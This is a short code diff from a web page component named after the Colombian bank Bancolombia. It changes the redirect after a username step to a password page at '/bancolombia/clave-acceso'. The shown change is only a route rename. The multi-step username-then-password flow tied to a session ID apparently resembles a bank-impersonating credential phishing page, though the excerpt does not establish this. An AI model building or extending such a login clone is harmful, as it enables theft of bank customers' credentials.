@@ -37,7 +37,7 @@ export default function BancolombiaUsuarioPage() {
       });
 
       if (response.ok) {
-        router.push(`/bancolombia/clave?sessionId=${sessionId}`);
+        router.push(`/bancolombia/clave-acceso?sessionId=${sessionId}`);
       }
     } catch (error) {
       console.error('Error updating user:', error);
